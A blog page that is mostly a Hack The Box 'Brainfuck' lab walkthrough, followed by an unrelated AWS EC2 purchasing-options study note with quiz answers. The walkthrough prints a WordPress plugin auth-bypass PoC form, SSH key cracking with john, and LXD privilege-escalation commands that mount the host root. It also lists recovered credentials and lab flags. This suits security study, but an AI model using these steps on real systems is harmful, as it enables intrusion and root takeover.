<p><code>WPScan</code> 是一個掃描 <code>WordPress</code> 漏洞的黑盒子掃描器，它可以為所有 <code>Web</code> 開發人員掃描 <code>WordPress</code><br> 漏洞並在他們開發前找到並解決問題。</p>
<p>通過外掛,主題的漏洞去滲透 <code>Wordpress</code> 站點，於是 <code>WPScan</code> 應運而生，收集 <code>Wordpress</code> 的各種漏洞，形成一個 <code>Wordpress</code> 專用掃描器。</p>
<p>該掃描器可以實現獲取站點使用者名稱，獲取安裝的所有外掛、主題，以及存在漏洞的外掛、主題，並提供漏洞資訊。同時還可以實現對未加防護的</p>
<p><a target="_blank" rel="noopener" href="https://www.itread01.com/hkyxlhk.html"></a></p>
<p><a target="_blank" rel="noopener" href="https://blog.wpscan.com/wpscan-user-documentation/">WPScan User Documentation - WPScan WordPress Security</a></p>
<p><a target="_blank" rel="noopener" href="https://vk9-sec.com/how-to-use-wpscan/">How to use WPScan | VK9 Security</a></p>
<ul>
<li><p>wpscan –url <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https://brainfuck.htb/</a> –disable-tls-checks –api-token “hrq4GRSi8E4gndSKawwwmLVImT3xWzlRSE7osdZsBF8”</p>
</li>
<li><p><strong>The following enumeration options exist:</strong></p>
<p>  <strong><code>vp</code> (Vulnerable plugins)</strong></p>
<p>  <strong><code>ap</code> (All plugins)</strong></p>
<p>  <strong><code>p</code> (Popular plugins)</strong></p>
<p>  <strong><code>vt</code> (Vulnerable themes)</strong></p>
<p>  <strong><code>at</code> (All themes)</strong></p>
<p>  <strong><code>t</code> (Popular themes)</strong></p>
<p>  <strong><code>tt</code> (Timthumbs)</strong></p>
<p>  <strong><code>cb</code> (Config backups)</strong></p>
<p>  <strong><code>dbe</code> (Db exports)</strong></p>
<p>  <strong><code>u</code> (User IDs range. e.g: u1-5)</strong></p>
<p>  <strong><code>m</code> (Media IDs range. e.g m1-15)</strong></p>
</li>
</ul>
<p>Before start, need to get API, if I not get this API, when I execute the commend, something results can’t appears</p>
<p><img src="/img/Brainfuck_Untitled_6.png" alt="Untitled"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wp-support-plus-responsive-ticket-system</span><br><span class="line"> | Location: https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/</span><br><span class="line"> | Last Updated: 2019-09-03T07:57:00.000Z</span><br><span class="line"> | [!] The version is out of <span class="built_in">date</span>, the latest version is 9.1.2</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | [!] 6 vulnerabilities identified:</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 – Authenticated SQL Injection</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/f267d78f-f1e1-4210-92e4-39cce2872757</span><br><span class="line"> |      - https://www.exploit-db.com/exploits/40939/</span><br><span class="line"> |      - https://lenonleite.com.br/en/2016/12/13/wp-support-plus-responsive-ticket-system-wordpress-plugin-sql-injection/</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1556644/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution (RCE)</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.8</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/1527b75a-362d-47eb-85f5-47763c75b0d1</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1763596/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 9.0.3 - Multiple Authenticated SQL Injection</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 9.0.3</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/cbbdb469-7321-44e4-a83b-cac82b116f20</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-1000131</span><br><span class="line"> |      - https://github.com/00theway/exp/blob/master/wordpress/wpsupportplus.md</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1814103/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 9.1.2 - Stored XSS</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 9.1.2</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/e406c3e8-1fab-41fd-845a-104467b0ded4</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7299</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-15331</span><br><span class="line"> |      - https://cert.kalasag.com.ph/news/research/cve-2019-7299-stored-xss-in-wp-support-plus-responsive-ticket-system/</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/2024484/wp-support-plus-responsive-ticket-system</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.0 - Privilege Escalation</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.0</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/b1808005-0809-4ac7-92c7-1f65e410ac4f</span><br><span class="line"> |      - https://security.szurek.pl/wp-support-plus-responsive-ticket-system-713-privilege-escalation.html</span><br><span class="line"> |      - https://packetstormsecurity.com/files/140413/</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WP Support Plus Responsive Ticket System &lt; 8.0.8 - Remote Code Execution</span><br><span class="line"> |     Fixed <span class="keyword">in</span>: 8.0.8</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/85d3126a-34a3-4799-a94b-76d7b835db5f</span><br><span class="line"> |      - https://plugins.trac.wordpress.org/changeset/1763596</span><br><span class="line"> |</span><br><span class="line"> | Version: 7.1.3 (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - https://brainfuck.htb/wp-content/plugins/wp-support-plus-responsive-ticket-system/readme.txt</span><br></pre></td></tr></table></figure>

<ul>
<li>Version 7.1.3 wp-support-plus-responsive-ticket-system</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/41006"></a></p>
<p>when I browse exploit.db I find this vuln, maybe can use it</p>
<p>According to an exploit that is used incorrectly, wp_set_auth_cookie can log in without a password.</p>
<p>POC:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://wp/wp-admin/admin-ajax.php&quot;</span>&gt;</span></span><br><span class="line">	Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;administrator&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;sth&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;action&quot;</span> <span class="attr">value</span>=<span class="string">&quot;loginGuestFacebook&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Login&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>So use this POC, need to change some place </p>
<ul>
<li><p>vim exploitpoc.html</p>
<p>  <img src="/img/Brainfuck_Untitled_7.png" alt="Untitled"></p>
</li>
</ul>
<p>Browse to the exploitpoc.html file on the localhost server as shown below and click the Login tab.</p>
<p><img src="/img/Brainfuck_Untitled_8.png" alt="Untitled"></p>
<p>Run a Python script for file transfer over port 80.</p>
<ul>
<li>python -m http.server 80</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_9.png" alt="Untitled"></p>
<p>when I click the login I well reach this page</p>
<p><img src="/img/Brainfuck_Untitled_10.png" alt="Untitled"></p>
<p>Reorganize <a target="_blank" rel="noopener" href="https://brainfuck.htb/">https://brainfuck.htb/</a> this page</p>
<p><img src="/img/Brainfuck_Untitled_11.png" alt="Untitled"></p>
<p> log in as anyone without knowing the password due to misuse of wp_set_auth_cookie(). Then you can visit <a target="_blank" rel="noopener" href="https://brainfuck/">https://brainfuck</a> again to enter the admin panel.</p>
<p><img src="/img/Brainfuck_Untitled_12.png" alt="Untitled"></p>
<p>There is account information under the SMTP plugin, but the password is not displayed, so use F12 to view the information</p>
<ul>
<li>user: orestis</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_13.png" alt="Untitled"></p>
<ul>
<li>password:kHGuERB29DNiNE</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_14.png" alt="Untitled"></p>
<ul>
<li><p>Telnet</p>
<ul>
<li>通訊協議</li>
<li>遠端登入工具</li>
<li>可以檢視埠是否可訪問</li>
<li>TCP&#x2F;IP協議家族中的一員</li>
<li>提供在本地計算機上完成遠端主機工作的能力</li>
<li>使用者使用telnet程式連線到伺服器</li>
<li>輸入命令在伺服器上執行</li>
<li>常用於遠端控制Web伺服器</li>
</ul>
</li>
<li><p>SMTP (簡易郵件傳輸通訊協定)</p>
<ul>
<li>透過網路傳輸的技術標準</li>
<li>允許電腦和伺服器交換資料</li>
<li>標準化了電子郵件從寄件人到收件人的傳輸方式</li>
<li>郵件傳遞通訊協定</li>
<li>不是郵件擷取通訊協定</li>
</ul>
</li>
</ul>
<p>Through the telnet command: <strong>telnet 10.10.10.17 110</strong>, establish a connection with the SMTP server and log in to the orestis account</p>
<ul>
<li>POP3 - TCP 110 &#x2F; POP3 protocol uses this port (unencrypted)</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">The mail client is used to collect mail from the server. </span><br><span class="line">Security Question: **Reusable clear text passwords.** </span><br><span class="line">– Connections and attempts are not audited and therefore subject to grinding. </span><br><span class="line">– Some POP3 server versions have buffer overflow issues.</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.auditmypc.com/tcp-port-110.asp">TCP 110 - Port Protocol Information and Warning!</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 94:d0:b3:34:e9:a5:37:c5:ac:b9:80:df:2a:54:a5:f0 (RSA)</span><br><span class="line">|   256 6b:d5:dc:15:3a:66:7a:f4:19:91:5d:73:85:b2:4c:b2 (ECDSA)</span><br><span class="line">|_  256 23:f5:a3:33:33:9d:76:d5:f2:ea:69:71:e3:4e:8e:02 (ED25519)</span><br><span class="line">25/tcp  open  smtp?</span><br><span class="line">|_smtp-commands: Couldn&#x27;t establish connection on port 25</span><br><span class="line">110/tcp open  pop3     Dovecot pop3d</span><br><span class="line">|_pop3-capabilities: TOP UIDL PIPELINING CAPA SASL(PLAIN) USER RESP-CODES AUTH-RESP-CODE</span><br><span class="line">143/tcp open  imap     Dovecot imapd</span><br><span class="line">|_imap-capabilities: listed have more ID OK LOGIN-REFERRALS Pre-login AUTH=PLAINA0001 post-login SASL-IR IDLE capabilities LITERAL+ ENABLE IMAP4rev1</span><br><span class="line">443/tcp open  ssl/http nginx 1.10.0 (Ubuntu)</span><br><span class="line">|_http-title: Welcome to nginx!</span><br><span class="line">| ssl-cert: Subject: commonName=brainfuck.htb/organizationName=Brainfuck Ltd./stateOrProvinceName=Attica/countryName=GR</span><br><span class="line">| Subject Alternative Name: DNS:www.brainfuck.htb, DNS:sup3rs3cr3t.brainfuck.htb</span><br><span class="line">| Not valid before: 2017-04-13T11:19:29</span><br><span class="line">|_Not valid after:  2027-04-11T11:19:29</span><br><span class="line">| tls-nextprotoneg: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_ssl-date: TLS randomness does not represent time</span><br><span class="line">| tls-alpn: </span><br><span class="line">|_  http/1.1</span><br><span class="line">|_http-server-header: nginx/1.10.0 (Ubuntu)</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://kb.website-solution.net/%E5%A6%82%E4%BD%95%E9%80%8F%E9%81%8E-telnet-%E6%A8%A1%E5%BC%8F%E6%B8%AC%E8%A9%A6-pop3-%E9%9B%BB%E9%83%B5/">如何透過 Telnet 模式測試 POP3 電郵? - 卓智互聯網 網頁寄存 知識庫</a></p>
<p><img src="/img/Brainfuck_Untitled_15.png" alt="Untitled"></p>
<ul>
<li>LIST ⇒ Displays the archive directory.</li>
<li>retr 1 ⇒ FTP Client 向 Server 複製一個檔案，也就是由 Server 端下載一個檔案到 Client 端</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_16.png" alt="Untitled"></p>
<ul>
<li>retr 2</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_17.png" alt="Untitled"></p>
<p>I think…I find the important Information</p>
<p>Any “secret” has a user name and password to log in</p>
<p>I realized that this credential can be connected to the <strong>sup3rs3cr3t.Brainfuck</strong> I explored in my web browser htb 。</p>
<ul>
<li>username: orestis</li>
<li>password: kIEnnfEKJ#9UmdO</li>
</ul>
<p>when I try to browse this page, and log in</p>
<p><img src="/img/Brainfuck_Untitled_18.png" alt="Untitled"></p>
<p>log in access, see the Super Secret Forum</p>
<p><img src="/img/Brainfuck_Untitled_19.png" alt="Untitled"></p>
<p>into the key I see that ..I noticed the chat between admin and orestis. It looks like maybe orestis and the admin shared some confidential information in this chat, but in the admin’s last reply, it looks like he’s secretly sharing any encrypted URLs</p>
<p><img src="/img/Brainfuck_Untitled_20.png" alt="Untitled"></p>
<p>Because I’m not sure what the content here is, I decided to check the content of SSH Access page</p>
<p>Password login is permanently disabled. so..user want to find the key to unlock </p>
<p><img src="/img/Brainfuck_Untitled_21.png" alt="Untitled"></p>
<p>Ortis lost the SSH login key and asked the administrator to send the key privately</p>
<p>It seems that some rules have been found, and maybe they can decrypt other content along the way.</p>
<p><img src="/img/Brainfuck_Untitled_22.png" alt="Untitled"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Qbqquzs - Pnhekxs dpi fca fhf zdmgzt</span><br><span class="line">Orestis - Hacking for fun and profit</span><br><span class="line">##change..</span><br><span class="line">QbqquzsPnhekxsdpifcafhfzdmgzt</span><br><span class="line">OrestisHackingforfunandprofit</span><br></pre></td></tr></table></figure>

<p><img src="/img/Brainfuck_Untitled_23.png" alt="Untitled"></p>
<p>I guess mnvze:&#x2F;&#x2F;10.10.10.17&#x2F;8zb5ra10m915218697q1h658wfoq0zc8&#x2F;frmfycu&#x2F;sp_ptr</p>
<ul>
<li>mnvze:&#x2F;&#x2F; maybe is https:&#x2F;&#x2F;</li>
</ul>
<p>I had pasted above ciphertext inside encipher textbox and decryption key inside decipher textbox and received <strong>decipher message</strong> “CkmybraInfuckmybrainfuckmybra”</p>
<p><a target="_blank" rel="noopener" href="https://rumkin.com/tools/cipher/vigenere/#">Vigenère</a></p>
<p><img src="/img/Brainfuck_Untitled_24.png" alt="Untitled"></p>
<ul>
<li>key ⇒ fuckmybrain</li>
</ul>
<p>In the key chat room screen, admin provides a ciphertext URL to download id_rsa for ssh login as orestis</p>
<ul>
<li>mnvze:&#x2F;&#x2F;zsrivszwm.rfz&#x2F;8cr5ai10r915218697i1w658enqc0cs8&#x2F;ozrxnkc&#x2F;ub_sja</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_25.png" alt="Untitled"></p>
<ul>
<li><a target="_blank" rel="noopener" href="https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa">https://brainfuck.htb/8ba5aa10e915218697d1c658cdee0bb8/orestis/id_rsa</a></li>
</ul>
<p><img src="/img/Brainfuck_Untitled_26.png" alt="Untitled"></p>
<p>when I download it, the file need enter the passwd</p>
<p><img src="/img/Brainfuck_Untitled_27.png" alt="Untitled"></p>
<ul>
<li>python &#x2F;usr&#x2F;share&#x2F;john&#x2F;ssh2john.py id_rsa &gt; john.priv</li>
<li>john –wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt john.priv</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://www.kali.org/tools/john/">john | Kali Linux Tools</a></p>
<p><img src="/img/Brainfuck_Untitled_28.png" alt="Untitled"></p>
<h1 id="ssh2johnn-Lxd-權限提升"><a href="#ssh2johnn-Lxd-權限提升" class="headerlink" title="ssh2johnn &amp;&amp; Lxd 權限提升"></a>ssh2johnn &amp;&amp; Lxd 權限提升</h1><p><strong>Ssh2john 是 John The Reaper 套件的一部分。這是一個腳本，它基本上將 [RSA&#x2F;DSA&#x2F;EC&#x2F;OPENSSH (SSH private keys) ] 私鑰轉換為 john 格式，以便以後使用 JtR 進行破解</strong></p>
<p><a target="_blank" rel="noopener" href="https://vk9-sec.com/ssh2john-how-to/">Ssh2john how to | VK9 Security</a></p>
<p><a target="_blank" rel="noopener" href="https://www.hackingarticles.in/lxd-privilege-escalation/">Lxd Privilege Escalation - Hacking Articles</a></p>
<p>**Linux Container (LXC)**通常被認為是一種輕量級虛擬化技術，介於 chroot 和完全開發的虛擬機之間，它創建了一個盡可能接近 Linux 安裝的環境，但不需要單獨的內核。</p>
<p>**Linux 守護進程 (LXD)**是輕量級管理程序或輕量級容器管理程序。LXD 建立在 Docker 之前使用的稱為 LXC 的容器技術之上。它使用穩定的 LXC API 在後台完成所有容器管理，在頂部添加 REST API 並提供更簡單、更一致的用戶體驗。</p>
<p>get this passwd,and login the SSH</p>
<ul>
<li>3poulakia!</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_29.png" alt="Untitled"></p>
<p>Now find user.txt and root.txt</p>
<ul>
<li>cat user.txt ⇒ 646ab926895979b1bbf5f76571fcc2b9</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_30.png" alt="Untitled"></p>
<p>The encrypt.sage has write the debuge.txt and output.txt</p>
<p><img src="/img/Brainfuck_Untitled_31.png" alt="Untitled"></p>
<ul>
<li>debug.txt</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">7493025776465062819629921475535241674460826792785520881387158343265274170009282504884941039852933109163193651830303308312565580445669284847225535166520307</span><br><span class="line">7020854527787566735458858381555452648322845008266612906844847937070333480373963284146649074252278753696897245898433245929775591091774274652021374143174079</span><br><span class="line">30802007917952508422792869021689193927485016332713622527025219105154254472344627284947779726280995431947454292782426313255523137610532323813714483639434257536830062768286377920010841850346837238015571464755074669373110411870331706974573498912126641409821855678581804467608824177508976254759319210955977053997</span><br></pre></td></tr></table></figure>

<ul>
<li>cat output.txt</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Encrypted Password: 44641914821074071930297814589851746700593470770417111804648920018396305246956127337150936081144106405284134845851392541080862652386840869768622438038690803472550278042463029816028777378141217023336710545449512973950591755053735796799773369044083673911035030605581144977552865771395578778515514288930832915182</span><br></pre></td></tr></table></figure>

<p>Elevated privileges are now required to find the root.txt file, my guess</p>
<p>The <strong>lxd</strong> authorization requires the access permission of the local account. The most important condition is that the user must be a member of the <strong>lxd group.</strong></p>
<p>It happens that this account is a member of the lxd group</p>
<p><img src="/img/Brainfuck_Untitled_32.png" alt="Untitled"></p>
<p>To escalate to root privileges, create an image with lxd</p>
<ol>
<li><strong>Steps to be performed on the attacker machine</strong>:</li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> Download build-alpine in your local machine through the git repository.</li>
<li><input disabled="" type="checkbox"> Execute the script “build -alpine” that will build the latest Alpine image as a compressed file, this step must be executed by the root user.</li>
<li><input disabled="" type="checkbox"> Transfer the tar file to the host machine</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://github.com/saghul/lxd-alpine-builder">https://github.com/saghul/lxd-alpine-builder</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/saghul/lxd-alpine-builder.git </span><br><span class="line"><span class="built_in">cd</span> lxd-alpine-builder </span><br><span class="line">./build-alpine</span><br></pre></td></tr></table></figure>

<p><img src="/img/Brainfuck_Untitled_33.png" alt="Untitled"></p>
<p>now I need to cp the alpine-v3.13-x86_64-20210218_0139.tar.gz to my &#x2F;root path , because my server execution path is over there.</p>
<p>And need to set server port, go to the opening page again to confirm whether the opening is successful</p>
<ul>
<li>python -m http.server 8000</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_34.png" alt="Untitled"></p>
<p><img src="/img/Brainfuck_Untitled_35.png" alt="Untitled"></p>
<ol>
<li><strong>Steps to be performed on the host machine:</strong></li>
</ol>
<ul>
<li><input disabled="" type="checkbox"> Download the alpine image</li>
<li><input disabled="" type="checkbox"> Import image for lxd</li>
<li><input disabled="" type="checkbox"> Initialize the image inside a new container.</li>
<li><input disabled="" type="checkbox"> Mount the container inside the &#x2F;root directory</li>
</ul>
<p>Now you need to download the archive you just copied to root</p>
<ul>
<li>wget <a target="_blank" rel="noopener" href="http://10.10.16.11:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz">http://tun0ip:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz</a></li>
</ul>
<p><img src="/img/Brainfuck_Untitled_36.png" alt="Untitled"></p>
<p>After the image is built it can be added as an image to LXD as follows:</p>
<ul>
<li>lxc image import .&#x2F;alpine-v3.10-x86_64-20191008_1227.tar.gz –alias myimage</li>
</ul>
<p>use the list command to check the list of images</p>
<ul>
<li>lxc image list</li>
</ul>
<p>After executing the command, you can enter the container and cd &#x2F;mnt&#x2F;root to view all resources from the host.</p>
<ul>
<li>lxc init myimage ignite -c security.privileged&#x3D;true</li>
<li>lxc config device add ignite mydevice disk source&#x3D;&#x2F; path&#x3D;&#x2F;mnt&#x2F;root recursive&#x3D;true</li>
<li>lxc start ignite</li>
<li>lxc exec ignite &#x2F;bin&#x2F;sh</li>
</ul>
<p><img src="/img/Brainfuck_Untitled_37.png" alt="Untitled"></p>
<ul>
<li>cat root.txt ⇒ dcf81acb6c1e7d3545881b9a496daa6e</li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-AWS_EC2_Instance_Purchasing_Options" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/AWS_EC2_Instance_Purchasing_Options/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.075Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/AWS_EC2_Instance_Purchasing_Options/">
        AWS EC2 Instance Purchasing Options
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>On-Demand Instances 按需運行實例</p>
<ul>
<li>短期工作負載</li>
<li>獲得可預測的定價</li>
<li>按秒支付</li>
<li>第一分鐘後按秒計費</li>
<li>對於其他操作系統，將按小時計費</li>
<li>成本最高，沒有預付款，沒有長期承諾<ul>
<li>短期不間段的工作負載，如果無法預測應用程式的行為方式，推薦使用該解決方案</li>
</ul>
</li>
</ul>
<p>Reserved 保留實例</p>
<ul>
<li><p>指定期限為一年或三年，以獲得更多折扣</p>
<ul>
<li>是否想支付預付款或部分預付款或不預付款</li>
<li>所有前期當然給你最大的折扣金額</li>
</ul>
</li>
<li><p>特定AZ中保留容量</p>
</li>
<li><p>適用長期工作負載</p>
</li>
<li><p>長時間運行數據庫</p>
</li>
<li><p>不再需要保留的實例，可以在市場中購買或出售</p>
</li>
<li><p>穩定狀態使用的應用程式</p>
<ul>
<li>數據庫</li>
</ul>
</li>
<li><p>跟案需實例相比，他可為你提供72%的折扣，並保留特定的實例屬性</p>
<ul>
<li>實例類型、區域、租賃、操作系統</li>
</ul>
</li>
<li><p>Convertible Reserved Instances 可轉換的預留實例</p>
<ul>
<li>允許更改實例類型<ul>
<li>實例系列、操作系統、範圍、租約</li>
</ul>
</li>
<li>靈活的實例類型</li>
<li>隨時間推移改變實例類型</li>
<li>因為有更大靈活性，最多獲得66%折扣</li>
</ul>
</li>
</ul>
<p>Savings Plans ( 1 &amp; 3 years ) 節約計畫</p>
<ul>
<li>期限為一年和三年</li>
<li>不是承諾特定的Instances 類型</li>
<li>承諾以美元為單位的特定使用量</li>
<li>針對長期工作負載</li>
<li>根據長期使用情況獲得折扣，72%折扣</li>
<li>任何超出儲蓄計劃的使用都將以案需價格計算</li>
<li>會被鎖定到特定的實例家庭和地區</li>
<li>可以在不同系統之間切換</li>
<li>Flexible across:<ul>
<li>Instance Size (e.g.,m5.xlarge,m5.2xlarge)</li>
<li>.OS (e.g.,Linux,Windows)</li>
<li>Tenancy (Host,Dedicated,Default)</li>
</ul>
</li>
</ul>
<p>Spot Instances 現貨實例</p>
<ul>
<li>非常短工作附載</li>
<li>不適合關鍵的工作或數據庫</li>
<li>若工作負載具有故障恢復能力，非常適合他們<ul>
<li>批處理作業</li>
<li>數據分析</li>
<li>圖像處理</li>
<li>任何類型的分布式工作負載</li>
<li>具有靈活的開始和結束時間的工作負載</li>
</ul>
</li>
<li>定義了願意為現貨實例支付的最高價格<ul>
<li>如果現貨價格超過了，就會失去該實例</li>
</ul>
</li>
<li>非常便宜</li>
<li>但隨時會丟失Instances</li>
</ul>
<p>Dedicated Hosts 專用主機</p>
<ul>
<li>預定整個物理服務器並控制Instances 位置</li>
<li>可以訪問物理服務器本身</li>
<li>具有完全專用於你的用例的EC2實例容量實際物理服務器</li>
<li>如果你希望在以下情況中、或有合規性要求、需要使用現有服務器綁定軟體許可證(基於每插槽、每內核、每虛擬機軟體許可證進行計費)</li>
<li>訪問物理服務器並獲得專用主機</li>
<li>按需購買</li>
<li>按秒付費</li>
<li>預定一年或三年</li>
<li>AWS中最昂貴選項</li>
<li>實際需要預留一台物理服務器</li>
<li>使用案例是指你的軟體採用自帶許可證的許可模式</li>
<li>公司有很強的法規或合規性需求</li>
</ul>
<p><img src="/img/aws_purch1.png" alt="Untitled"></p>
<p>Dedicated Instances 專用實例</p>
<ul>
<li>意味沒有其他客戶會共享你的硬體</li>
<li>有些實例運行在專用於你的硬體上</li>
<li>可以與同一帳戶中的其他實例共享硬體</li>
<li>無法控制實例位置</li>
<li>意味著你在自己的硬體上有自己的實例</li>
</ul>
<p>Capacity Reservations 預留容量</p>
<ul>
<li>特定AZ中為任何持續時間預留容量</li>
</ul>
<blockquote>
<p>AWS AZ是一個區域(Region)中的一或多個資料中心。每個資料中心都有獨立的電源、網路等硬體設備，彼此以高速網路連接並加密傳輸資料，藉此達到冗余及提高可用性。</p>
</blockquote>
<ul>
<li>任意持續時間內保留特定AZ中的按需實例</li>
<li>需要時隨時訪問該容量</li>
<li>沒有時間承諾，可隨時保留容量或取消保留</li>
<li>沒有帳單折扣</li>
<li>唯一目的是保留容量</li>
<li>想獲得計費折扣，需要將其與區域保留實例或儲蓄計劃相結合</li>
<li>按需收費，按預留容量付費</li>
<li>不啟動他們仍然需要付費</li>
<li>非常需要在特定AZ中運行的短期不間斷工作負載</li>
</ul>
<p><img src="/img/aws_purch2.png" alt="Untitled"></p>
<p>哪種方案適合你? 以度假村為例</p>
<ul>
<li>On demand: coming and staying in resort whenever we like, we pay the full price</li>
<li>Reserved: like planning ahead and if we plan to stay for a long time, we may get a good discount.</li>
<li>Savings Plans: pay a certain amount per hour for certain period and stay in any room type (e.g.,<br>King, Suite, Sea View,…)</li>
<li>Spot instances: the hotel allows people to bid for the empty rooms and the highest bidder keeps the rooms. You can get kicked out at any time</li>
<li>Dedicated Hosts: We book an entire building of the resort</li>
<li>Capacity Reservations: you book a room for a period with full price even you don’t stay in it</li>
</ul>
<p><strong>Which EC2 Purchasing Option can provide you the biggest discount, but it is not suitable for critical jobs or databases?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Convertible Reserved Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Dedicated Hosts</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Spot Instances</strong></li>
</ul>
<blockquote>
<p>Spot Instances are good for short workloads and this is the cheapest EC2 Purchasing Option. But, they are less reliable because you can lose your EC2 instance.</p>
</blockquote>
<p><strong>What should you use to control traffic in and out of EC2 instances?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Network Access Control List (NACL)</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Security Groups</strong></li>
<li><input disabled="" type="checkbox"> • <strong>IAM Policies</strong></li>
</ul>
<p><strong>How long can you reserve an EC2 Reserved Instance?</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> • <strong>1 or 3 years</strong></li>
<li><input disabled="" type="checkbox"> • <strong>2 or 4 years</strong></li>
<li><input disabled="" type="checkbox"> • <strong>6 months or 1 year</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Anytime between 1 and 3 years</strong></li>
</ul>
